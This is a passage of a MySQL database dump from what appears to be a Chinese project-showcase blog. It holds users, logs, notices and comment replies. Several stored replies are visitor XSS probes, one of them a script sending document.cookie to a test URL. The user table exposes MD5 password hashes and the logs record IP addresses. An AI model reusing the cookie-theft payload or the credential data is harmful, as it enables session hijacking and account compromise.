<strong>2、file标签不需要再设置display:none隐藏，而是通过opacity:0让它完全透明，实际它是浮在a标签之上</strong> \r\n</p>\r\n<p>\r\n	<strong>3、file标签设置position:absolute后要给left:0、top:0，否则file标签不会吻合覆盖a标签导致点击按钮的时候点不到file标签</strong> \r\n</p>\r\n<p>\r\n	我们再来测试一下：\r\n</p>\r\n<p>\r\n	点击按钮：\r\n</p>\r\n<img src="/attached/image/20160401/20160401001835_63478.jpg" alt="" /> \r\n<p>\r\n	选择文件：\r\n</p>\r\n<img src="/attached/image/20160401/20160401001906_29262.jpg" alt="" /> \r\n<p>\r\n	上传成功！\r\n</p>', '2016-04-01 00:19:20', 76, 'Repaint');

-- --------------------------------------------------------

--
-- 表的结构 `qo_attach`
--

CREATE TABLE IF NOT EXISTS `qo_attach` (
  `AID` int(11) NOT NULL AUTO_INCREMENT,
  `Author` char(20) NOT NULL,
  `FileSize` char(20) NOT NULL,
  `FileName` text NOT NULL,
  `RealFileName` text NOT NULL,
  `DownCount` int(11) NOT NULL,
  PRIMARY KEY (`AID`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=6 ;

--
-- 转存表中的数据 `qo_attach`
--

INSERT INTO `qo_attach` (`AID`, `Author`, `FileSize`, `FileName`, `RealFileName`, `DownCount`) VALUES
(1, '1', '156.64 KB', 'Chat_20150901.zip', 'attached/file/20160223/bcparnrbovpkgsto.zip', 2),
(2, '1', '5.27 MB', 'JigsawPuzzle_20151229.zip', 'attached/file/20160224/cwoowlpmihivjcmy.zip', 21),
(3, '1', '1.58 MB', 'ThoughtReader_20151215.zip', 'attached/file/20160224/zzzhaspsctmabcfx.zip', 2),
(4, '1', '659.84 KB', 'Hanoi_20151015.zip', 'attached/file/20160227/awxnqyftftipgmlz.zip', 0),
(5, '1', '6.23 MB', 'NewsPublisher_20160106.zip', 'attached/file/20160302/qkzunfvrnuxmsuxp.zip', 3);

-- --------------------------------------------------------

--
-- 表的结构 `qo_authority`
--

CREATE TABLE IF NOT EXISTS `qo_authority` (
  `AuthID` int(11) NOT NULL AUTO_INCREMENT,
  `AuthName` char(20) NOT NULL,
  PRIMARY KEY (`AuthID`),
  UNIQUE KEY `AuthName` (`AuthName`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=10 ;

--
-- 转存表中的数据 `qo_authority`
--

INSERT INTO `qo_authority` (`AuthID`, `AuthName`) VALUES
(1, 'Comment'),
(3, 'Download'),
(2, 'Manage'),
(9, 'NoPend'),
(8, 'NoValidateCode'),
(7, 'Register'),
(4, 'Search'),
(5, 'SendMessage'),
(6, 'VisitUserHome');

-- --------------------------------------------------------

--
-- 表的结构 `qo_class`
--

CREATE TABLE IF NOT EXISTS `qo_class` (
  `CID` int(10) NOT NULL AUTO_INCREMENT,
  `ClassName` char(20) NOT NULL,
  `Link` text,
  `Parent` int(10) NOT NULL,
  `Sequence` int(10) NOT NULL,
  `ICON` text,
  PRIMARY KEY (`CID`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=14 ;

--
-- 转存表中的数据 `qo_class`
--

INSERT INTO `qo_class` (`CID`, `ClassName`, `Link`, `Parent`, `Sequence`, `ICON`) VALUES
(1, 'Windows应用', '', 0, 1, NULL),
(2, 'Web应用', '', 0, 2, NULL),
(3, '移动应用', '', 0, 3, NULL),
(4, 'Java', '', 1, 1, '20160429-2.jpg'),
(5, 'C#', '', 1, 2, '20160430-1.jpg'),
(6, 'VB6', '', 1, 3, NULL),
(7, 'PHP', '', 2, 1, '20160430-2.jpg'),
(8, 'ASP.NET', '', 2, 2, NULL),
(9, 'JavaScript', '', 2, 4, '20160430-4.jpg'),
(10, 'Android', '', 3, 1, '20160430-5.jpg'),
(11, '主页', 'index.php', 0, 0, NULL),
(12, '反馈', 'article.php?mod=view&amp;tid=2', 0, 4, NULL),
(13, 'HTML', '', 2, 3, '20160430-3.jpg');

-- --------------------------------------------------------

--
-- 表的结构 `qo_group`
--

CREATE TABLE IF NOT EXISTS `qo_group` (
  `GID` int(10) NOT NULL AUTO_INCREMENT,
  `GroupName` char(20) NOT NULL,
  `Authority` text NOT NULL,
  PRIMARY KEY (`GID`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=5 ;

--
-- 转存表中的数据 `qo_group`
--

INSERT INTO `qo_group` (`GID`, `GroupName`, `Authority`) VALUES
(1, '管理员', '1;2;3;4;5;6;7;8;9'),
(2, '普通会员', '1;3;4;5;6;7'),
(3, '游客', '1;4;6;7'),
(4, '测试管理员', '1;2;3;4;5;6;7;8;9');

-- --------------------------------------------------------

--
-- 表的结构 `qo_indeximg`
--

CREATE TABLE IF NOT EXISTS `qo_indeximg` (
  `NO` int(10) NOT NULL,
  `Sequence` int(11) NOT NULL,
  `Title` char(20) NOT NULL,
  `Link` text NOT NULL,
  `FileName` text NOT NULL,
  UNIQUE KEY `NO` (`NO`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `qo_indeximg`
--

INSERT INTO `qo_indeximg` (`NO`, `Sequence`, `Title`, `Link`, `FileName`) VALUES
(1, 1, 'Blown个人博客系统', 'article.php?mod=view&amp;tid=7', '20160403-2.png'),
(2, 2, 'Jigsaw Puzzle拼图游戏', 'article.php?mod=view&amp;tid=3', '20160403-1.png'),
(3, 3, 'Magic Chat Suite聊天系统', 'article.php?mod=view&amp;tid=1', '20160403-3.png');

-- --------------------------------------------------------

--
-- 表的结构 `qo_logs`
--

CREATE TABLE IF NOT EXISTS `qo_logs` (
  `LID` int(10) NOT NULL AUTO_INCREMENT,
  `UID` int(10) DEFAULT NULL,
  `IP` char(15) NOT NULL,
  `Time` datetime NOT NULL,
  `Action` text NOT NULL,
  PRIMARY KEY (`LID`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=89 ;

--
-- 转存表中的数据 `qo_logs`
--

INSERT INTO `qo_logs` (`LID`, `UID`, `IP`, `Time`, `Action`) VALUES
(1, 1, '14.29.91.91', '2016-02-23 15:12:12', '登录用户{幻想小籽}'),
(2, 3, '182.139.134.99', '2016-02-23 18:00:01', '注册用户{liangzm}'),
(3, 2, '14.29.91.91', '2016-02-23 18:54:24', '登录用户{QDY}'),
(4, 1, '112.96.106.178', '2016-02-23 19:11:17', '下载附件{Chat_20150901.zip}'),
(5, 2, '14.29.91.91', '2016-02-23 21:32:59', '登录用户{QDY}'),
(6, 4, '125.34.52.133', '2016-02-23 23:08:07', '注册用户{小黑公主}'),
(7, 5, '14.147.4.133', '2016-02-23 23:12:21', '注册用户{我才是星辰}'),
(8, 1, '14.29.91.91', '2016-02-23 23:58:39', '登录用户{幻想小籽}'),
(9, 5, '14.147.4.133', '2016-02-24 00:23:28', '登录用户{我才是星辰}'),
(10, 2, '59.37.147.84', '2016-02-24 11:59:55', '下载附件{JigsawPuzzle_20151229.zip}'),
(11, 2, '14.17.37.69', '2016-02-24 12:13:06', '登录用户{QDY}'),
(12, 2, '14.17.37.43', '2016-02-24 12:13:24', '下载附件{JigsawPuzzle_20151229.zip}'),
(13, 2, '59.37.147.84', '2016-02-24 12:13:25', '下载附件{JigsawPuzzle_20151229.zip}'),
(32, 2, '59.37.147.84', '2016-02-24 13:32:02', '下载附件{ThoughtReader_20151215.zip}'),
(33, 1, '59.37.147.84', '2016-02-24 15:53:37', '登录用户{幻想小籽}'),
(34, 2, '59.37.147.84', '2016-02-24 19:05:14', '下载附件{ThoughtReader_20151215.zip}'),
(35, 1, '112.96.176.175', '2016-02-25 14:49:45', '下载附件{ThoughtReader_20151215.zip}'),
(36, 1, '112.96.176.175', '2016-02-25 14:49:55', '下载附件{ThoughtReader_20151215.zip}'),
(37, 1, '153.35.90.230', '2016-02-25 14:49:59', '下载附件{ThoughtReader_20151215.zip}'),
(38, 1, '121.41.48.83', '2016-02-25 14:50:07', '下载附件{ThoughtReader_20151215.zip}'),
(39, 1, '122.13.132.199', '2016-02-28 15:19:21', '登录用户{幻想小籽}'),
(40, 1, '121.32.26.106', '2016-02-29 07:57:08', '登录用户{幻想小籽}'),
(41, 1, '121.32.26.106', '2016-02-29 09:50:01', '登录用户{幻想小籽}'),
(42, 1, '121.32.26.106', '2016-03-01 10:42:06', '登录用户{幻想小籽}'),
(43, 1, '14.23.170.66', '2016-03-07 09:55:08', '下载附件{NewsPublisher_20160106.zip}'),
(44, 1, '122.228.18.147', '2016-03-11 23:06:27', '下载附件{NewsPublisher_20160106.zip}'),
(45, 1, '221.204.207.41', '2016-03-12 13:27:37', '下载附件{NewsPublisher_20160106.zip}'),
(46, 1, '-', '2016-03-20 15:09:00', '下载附件{Hanoi_20151015.zip}'),
(47, 1, '-', '2016-03-22 11:15:00', '登录用户{幻想小籽}'),
(48, 6, '-', '2016-03-25 10:43:59', '登录用户{111}'),
(49, 1, '-', '2016-03-25 14:37:38', '登录用户{幻想小籽}'),
(50, 1, '219.222.214.35', '2016-03-25 16:12:31', '登录用户{幻想小籽}'),
(51, 1, '14.215.33.19', '2016-03-25 16:51:01', '登录用户{幻想小籽}'),
(52, 1, '14.215.43.82', '2016-03-27 11:55:05', '登录用户{幻想小籽}'),
(53, 1, '14.215.62.40', '2016-03-27 11:58:18', '登录用户{幻想小籽}'),
(54, 6, '219.137.26.162', '2016-03-29 16:51:55', '注册用户{ttt}'),
(55, 6, '219.137.26.162', '2016-03-29 16:52:42', '登录用户{ttt}'),
(56, 6, '219.137.26.162', '2016-03-29 16:53:55', '下载附件{NewsPublisher_20160106.zip}'),
(57, 7, '113.74.234.215', '2016-03-29 18:31:53', '注册用户{aaaa}'),
(58, 8, '113.74.234.215', '2016-03-29 18:38:22', '注册用户{aaa}'),
(59, 9, '183.6.31.102', '2016-03-29 20:17:52', '注册用户{123456}'),
(60, 10, '112.96.164.111', '2016-03-29 21:17:38', '注册用户{123}'),
(61, 11, '183.6.31.160', '2016-03-29 22:20:31', '注册用户{222333}'),
(62, 12, '182.151.230.60', '2016-03-30 16:55:41', '注册用户{赵洪川}'),
(63, 13, '113.107.26.239', '2016-03-30 23:25:00', '注册用户{1234}'),
(64, 1, '14.215.40.112', '2016-04-01 08:13:20', '登录用户{幻想小籽}'),
(65, 14, '115.172.97.61', '2016-04-01 22:59:38', '注册用户{llh}'),
(66, 1, '219.222.214.35', '2016-04-02 23:22:55', '登录用户{幻想小籽}'),
(67, 15, '-', '2016-04-03 15:33:06', '登录用户{TestAdmin}'),
(68, 16, '61.140.154.92', '2016-04-03 22:54:00', '注册用户{123456654}'),
(69, 17, '111.181.2.131', '2016-04-05 11:04:56', '注册用户{123456789}'),
(70, 18, '183.6.31.106', '2016-04-08 10:36:07', '注册用户{789}'),
(71, 18, '183.6.31.106', '2016-04-08 10:36:49', '登录用户{789}'),
(72, 19, '113.108.201.170', '2016-04-13 16:07:17', '注册用户{1747800952}'),
(73, 1, '219.222.214.32', '2016-04-13 17:35:43', '登录用户{幻想小籽}'),
(74, 20, '101.107.85.96', '2016-04-14 16:53:42', '注册用户{124}'),
(75, 22, '222.134.6.84', '2016-04-26 16:55:33', '注册用户{ilas}'),
(76, 22, '222.134.6.84', '2016-04-26 16:55:45', '下载附件{Chat_20150901.zip}'),
(77, 22, '222.134.6.84', '2016-04-26 17:05:24', '下载附件{NewsPublisher_20160106.zip}'),
(78, 15, '218.18.156.109', '2016-04-27 15:10:01', '登录用户{TestAdmin}'),
(79, 15, '218.18.156.109', '2016-04-27 15:13:26', '下载附件{Hanoi_20151015.zip}'),
(80, 15, '218.18.156.109', '2016-04-27 15:13:27', '下载附件{Hanoi_20151015.zip}'),
(81, 23, '183.160.203.67', '2016-04-27 16:10:41', '注册用户{volxcy}'),
(82, 23, '183.160.203.67', '2016-04-27 16:10:52', '下载附件{ThoughtReader_20151215.zip}'),
(83, 24, '1.204.62.185', '2016-04-27 17:37:18', '注册用户{gaodi}'),
(84, 1, '121.32.26.106', '2016-04-28 11:18:19', '登录用户{幻想小籽}'),
(85, 15, '182.126.10.58', '2016-04-29 16:10:47', '登录用户{TestAdmin}'),
(86, 15, '116.26.217.169', '2016-04-29 23:25:44', '登录用户{TestAdmin}'),
(87, 15, '123.152.102.130', '2016-04-30 12:29:39', '登录用户{TestAdmin}'),
(88, 1, '-', '2016-04-30 17:25:12', '下载附件{Chat_20150901.zip}');

-- --------------------------------------------------------

--
-- 表的结构 `qo_message`
--

CREATE TABLE IF NOT EXISTS `qo_message` (
  `MID` int(10) NOT NULL AUTO_INCREMENT,
  `UID` int(10) DEFAULT NULL,
  `RID` int(10) DEFAULT NULL,
  `ToUID` int(10) NOT NULL,
  `MsgType` char(20) NOT NULL,
  `MsgContent` text,
  `Time` datetime NOT NULL,
  `isRead` char(5) NOT NULL DEFAULT 'False',
  PRIMARY KEY (`MID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `qo_notice`
--

CREATE TABLE IF NOT EXISTS `qo_notice` (
  `NID` int(10) NOT NULL AUTO_INCREMENT,
  `UID` int(10) NOT NULL,
  `Title` text NOT NULL,
  `NoticeType` char(10) NOT NULL,
  `Content` text NOT NULL,
  `Time` datetime NOT NULL,
  `Status` char(5) NOT NULL,
  PRIMARY KEY (`NID`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=4 ;

--
-- 转存表中的数据 `qo_notice`
--

INSERT INTO `qo_notice` (`NID`, `UID`, `Title`, `NoticeType`, `Content`, `Time`, `Status`) VALUES
(1, 1, '<span class="bolder" style="color: rgb(204, 51, 229);">Blown个人博客系统发布啦！</span>', 'String', '大致的功能已经开发完成。<br />持续更新中。。。<br />比赛过后开源', '2016-04-11 23:17:26', 'Show'),
(2, 1, '<span style="color: rgb(255, 153, 0);" class="bolder">消息系统上线！回帖可收到通知！</span>', 'String', '在资料页面可发送短消息。<br />别人回帖时能收到通知。<br />隐私设置新增是否接收短消息。', '2016-04-24 15:54:49', 'Show'),
(3, 1, '<span class="bolder" style="color: rgb(0, 213, 255);">后台管理测试帐号开通！</span>', 'String', '帐号密码均为TestAdmin。<br />由于安全原因，此帐号只能访问后台，不能提交更改。', '2016-04-26 19:55:40', 'Show');

-- --------------------------------------------------------

--
-- 表的结构 `qo_reply`
--

CREATE TABLE IF NOT EXISTS `qo_reply` (
  `RID` int(10) NOT NULL AUTO_INCREMENT,
  `TID` int(10) NOT NULL,
  `UID` int(10) DEFAULT NULL,
  `VisitorName` char(20) DEFAULT NULL,
  `Quote` int(10) DEFAULT NULL,
  `ReplyContent` text NOT NULL,
  `Time` datetime NOT NULL,
  `ReplyIP` char(15) NOT NULL,
  `Status` char(10) NOT NULL,
  PRIMARY KEY (`RID`),
  KEY `qo_article_reply_ibfk_1` (`TID`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=37 ;

--
-- 转存表中的数据 `qo_reply`
--

INSERT INTO `qo_reply` (`RID`, `TID`, `UID`, `VisitorName`, `Quote`, `ReplyContent`, `Time`, `ReplyIP`, `Status`) VALUES
(1, 2, NULL, 'YXM', NULL, '软件的孩子都这么厉害的吗', '2016-02-25 14:13:23', '-', '通过'),
(3, 4, NULL, 'ZJW', NULL, '打唔开水晶球', '2016-02-26 13:15:00', '-', '通过'),
(4, 4, NULL, '森哥', NULL, '那些符号代表什么意思？有什么意义？', '2016-02-27 09:58:52', '-', '通过'),
(5, 4, 1, NULL, 4, '有的是十二星座的符号<br />没什么意义，只是用来区分，什么图案都可以', '2016-02-27 12:03:09', '-', '通过'),
(9, 4, NULL, '哼', NULL, '根本打不开，垃圾软件。大家千万别下！', '2016-02-28 15:01:22', '-', '不通过'),
(10, 6, NULL, '不告诉你', NULL, '演示地址什么时候放出？', '2016-03-05 18:02:18', '59.37.144.28', '通过'),
(11, 6, 1, NULL, 10, '现在好了', '2016-03-06 21:36:12', '122.13.132.203', '通过'),
(12, 6, 6, NULL, NULL, 'ttt', '2016-03-29 16:53:37', '219.137.26.162', '通过'),
(13, 2, NULL, '我是黑客', NULL, '&lt;script&gt;<br />for(var i=0;i&lt;10;i++){<br />  alert(&quot;测试&quot;);<br />}<br />&lt;/script&gt;', '2016-03-29 18:37:17', '113.74.234.215', '通过'),
(14, 2, NULL, 'greg', NULL, 'dg', '2016-03-29 18:37:38', '113.74.234.215', '通过'),
(15, 2, 8, NULL, NULL, '&lt;script&gt;<br />for(var i=0;i&lt;10;i++){<br />alert(&quot;test&quot;);<br />}<br /><br />&lt;/script&gt;', '2016-03-29 18:39:31', '113.74.234.215', '通过'),
(16, 1, NULL, 'zlh', NULL, '测试', '2016-03-29 20:52:50', '183.13.72.223', '通过'),
(17, 6, NULL, '呢', NULL, 'gn', '2016-03-29 22:19:47', '183.6.31.160', '通过'),
(18, 2, 11, NULL, NULL, '我发', '2016-03-29 22:21:05', '183.6.31.160', '通过'),
(19, 2, NULL, '', NULL, ' ', '2016-03-29 22:33:15', '111.22.8.129', '不通过'),
(20, 1, NULL, '测定', 16, '测出的撒旦发射点发', '2016-03-30 08:46:53', '58.252.69.227', '通过'),
(21, 7, NULL, 'weq', NULL, 'rewqewqeqe', '2016-03-30 22:16:46', '183.6.31.133', '通过'),
(22, 1, NULL, 'ww', NULL, 'dddddd', '2016-03-31 17:34:46', '113.104.33.222', '通过'),
(23, 1, 8, NULL, NULL, '&lt;script&gt;alert(&quot;454&quot;)&lt;/script&gt;', '2016-04-02 18:52:35', '113.74.234.235', '通过'),
(24, 2, NULL, '111', NULL, '很好很好很好', '2016-04-02 19:21:25', '202.104.157.198', '通过'),
(25, 1, NULL, 'a', 20, 'aaaaaa', '2016-04-03 11:45:35', '58.255.228.180', '通过'),
(26, 2, NULL, 'r', 15, '&lt;script&gt;<br />for(var i=0;i&lt;10;i++){<br />alert(&quot;test&quot;);<br />}<br /><br />&lt;/script&gt;', '2016-04-03 22:52:22', '61.140.154.92', '通过'),
(27, 4, 16, NULL, NULL, '当重复两次后就错误了<br />什么原理？', '2016-04-03 23:00:52', '61.140.154.92', '通过'),
(28, 2, 16, NULL, NULL, '&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;alert(''师兄来攻击'')&lt;/script&gt;', '2016-04-03 23:03:02', '61.140.154.92', '通过'),
(29, 2, NULL, '游客', NULL, '&lt;script&gt;document.location = ''http://localhost/test.php?cookie='' + document.cookie;&lt;/script&gt;', '2016-04-03 23:09:41', '61.140.154.92', '通过'),
(30, 4, 1, NULL, 27, '这个是不会有错的，除非是你计算过程中出现错误，结果自然就是错的', '2016-04-03 23:39:36', '124.174.131.53', '通过'),
(31, 2, NULL, 'vdr', NULL, 'vrxdvrxdvrxdvrxd', '2016-04-05 11:04:01', '183.54.240.67', '通过'),
(32, 9, 17, NULL, NULL, '很不错啊 ！！！！', '2016-04-05 11:06:01', '111.181.2.131', '通过'),
(33, 2, NULL, 'fasdfdsf', NULL, 'fsdafdsadasdas', '2016-04-06 09:28:12', '121.33.226.172', '通过'),
(34, 7, NULL, 'xxx', NULL, 'bjdkaewhnk', '2016-04-06 16:15:57', '219.222.214.33', '通过'),
(35, 7, NULL, 'ccc', NULL, 'gjhgkcxvz', '2016-04-06 16:16:29', '219.222.214.33', '通过'),
(36, 6, NULL, 'asd', NULL, 'asdasdasdasd', '2016-04-13 16:06:35', '113.108.201.170', '通过');

-- --------------------------------------------------------

--
-- 表的结构 `qo_setting`
--

CREATE TABLE IF NOT EXISTS `qo_setting` (
  `Name` char(20) NOT NULL,
  `Value` char(20) NOT NULL,
  PRIMARY KEY (`Name`),
  UNIQUE KEY `Name` (`Name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `qo_setting`
--

INSERT INTO `qo_setting` (`Name`, `Value`) VALUES
('AdminGroup', '1'),
('AllowComment', 'YES'),
('AllowRegister', 'YES'),
('AllowVisit', 'YES'),
('DefaultGroup', '2'),
('RootUser', '1'),
('TestAdminGroup', '4'),
('VisitorGroup', '3');

-- --------------------------------------------------------

--
-- 表的结构 `qo_user`
--

CREATE TABLE IF NOT EXISTS `qo_user` (
  `UID` int(10) NOT NULL AUTO_INCREMENT,
  `GID` int(10) NOT NULL,
  `Username` char(20) NOT NULL,
  `Password` char(32) NOT NULL,
  `RegIP` char(15) NOT NULL,
  `RegDate` datetime NOT NULL,
  `LastLogin` datetime NOT NULL,
  `Privacy` char(20) NOT NULL,
  PRIMARY KEY (`UID`),
  UNIQUE KEY `Username` (`Username`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=25 ;

--
-- 转存表中的数据 `qo_user`
--

INSERT INTO `qo_user` (`UID`, `GID`, `Username`, `Password`, `RegIP`, `RegDate`, `LastLogin`, `Privacy`) VALUES
(1, 1, '幻想小籽', '49c7823dad1ea980405dd6909b15d04d', '-', '2016-02-01 12:00:00', '2016-04-30 17:25:20', 'Home;Msg'),
(2, 2, 'QDY', '3932a1c32e6bfe5369b3db586370b5a9', '-', '2016-02-23 16:58:41', '2016-02-28 14:59:47', 'Home;Msg'),
(3, 2, 'liangzm', '85abc4cca4498e7e1d2dd33158a4d7a1', '182.139.134.99', '2016-02-23 18:00:01', '2016-02-23 18:05:30', 'Home;Msg'),
(4, 2, '小黑公主', 'acd11ebad04deef19903433529961aac', '125.34.52.133', '2016-02-23 23:08:07', '2016-02-23 23:56:12', 'Home;Msg'),
(5, 2, '我才是星辰', 'ab900ee8670cad291f607c00ff2d458b', '14.147.4.133', '2016-02-23 23:12:21', '2016-02-24 00:47:24', 'Home;Msg'),
(6, 2, 'ttt', '0999525a84a48dd630439156954511a0', '219.137.26.162', '2016-03-29 16:51:55', '2016-03-29 16:53:39', 'Home;Msg'),
(7, 2, 'aaaa', '20bc10eda57bf2cf41f2d44a45c03ee3', '113.74.234.215', '2016-03-29 18:31:53', '2016-03-29 18:33:07', 'Home;Msg'),
(8, 2, 'aaa', '0999525a84a48dd630439156954511a0', '113.74.234.215', '2016-03-29 18:38:22', '2016-04-04 10:23:17', 'Home;Msg'),
(9, 2, '123456', '0999525a84a48dd630439156954511a0', '183.6.31.102', '2016-03-29 20:17:52', '2016-03-29 20:18:15', 'Home;Msg'),
(10, 2, '123', '0999525a84a48dd630439156954511a0', '112.96.164.111', '2016-03-29 21:17:38', '2016-03-29 21:17:54', 'Home;Msg'),
(11, 2, '222333', '762a82f9c81f25384dad934f98ae0b91', '183.6.31.160', '2016-03-29 22:20:31', '2016-03-29 22:21:07', 'Home;Msg'),
(12, 2, '赵洪川', '31c65a78cd92560f2ea10eaec76d2561', '182.151.230.60', '2016-03-30 16:55:41', '2016-03-30 16:57:34', 'Home;Msg'),
(13, 2, '1234', '25b08f95b5508094d32c4c8108dd0b9d', '113.107.26.239', '2016-03-30 23:25:00', '2016-04-01 15:40:46', 'Home;Msg'),
(14, 2, 'llh', '8f793b60dd65451d66a5dbd388b560b2', '115.172.97.61', '2016-04-01 22:59:38', '2016-04-01 23:00:12', 'Home;Msg'),
(15, 4, 'TestAdmin', '6e348a3609585ec34377803eb8fe2548', '-', '2016-04-03 15:32:20', '2016-04-30 12:29:54', 'Home;Msg'),
(16, 2, '123456654', '0999525a84a48dd630439156954511a0', '61.140.154.92', '2016-04-03 22:54:00', '2016-04-03 23:03:04', 'Home;Msg'),
(17, 2, '123456789', '0999525a84a48dd630439156954511a0', '111.181.2.131', '2016-04-05 11:04:56', '2016-04-05 11:06:25', 'Home;Msg'),
(18, 2, '789', '0999525a84a48dd630439156954511a0', '183.6.31.106', '2016-04-08 10:36:07', '2016-04-08 11:06:00', 'Home;Msg'),
(19, 2, '1747800952', '287f73dc3ca78f28c051ede90230560b', '113.108.201.170', '2016-04-13 16:07:17', '2016-04-13 16:07:30', 'Home;Msg'),
(20, 2, '124', 'e0291c87d3ce38299ba3a9982bd8936a', '101.107.85.96', '2016-04-14 16:53:42', '2016-04-14 16:54:04', 'Home;Msg'),
(21, 2, 'Resmic', '689f74ff718d015214466da7fdb0f8da', '119.131.153.116', '2016-04-10 22:23:34', '2016-04-10 22:54:25', 'Home;Msg'),
(22, 2, 'ilas', 'e9ea9a47c4d268f7a00bac57b180770a', '222.134.6.84', '2016-04-26 16:55:33', '2016-04-26 17:05:19', 'Home;Msg'),
(23, 2, 'volxcy', '07a0648aaffd80ec5579ff25431fc118', '183.160.203.67', '2016-04-27 16:10:41', '2016-04-27 16:10:50', 'Home;Msg'),
(24, 2, 'gaodi', '25b08f95b5508094d32c4c8108dd0b9d', '1.204.62.185', '2016-04-27 17:37:18', '2016-04-27 21:21:50', 'Home;Msg');

--
-- 限制导出的表
--

--
-- 限制表 `qo_article`
--
ALTER TABLE `qo_article`
  ADD CONSTRAINT `qo_article_ibfk_1` FOREIGN KEY (`CID`) REFERENCES `qo_class` (`CID`) ON DELETE CASCADE ON UPDATE CASCADE;

--
-- 限制表 `qo_reply`
--
ALTER TABLE `qo_reply`
  ADD CONSTRAINT `qo_reply_ibfk_1` FOREIGN KEY (`TID`) REFERENCES `qo_article` (`TID`) ON DELETE CASCADE ON UPDATE CASCADE;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
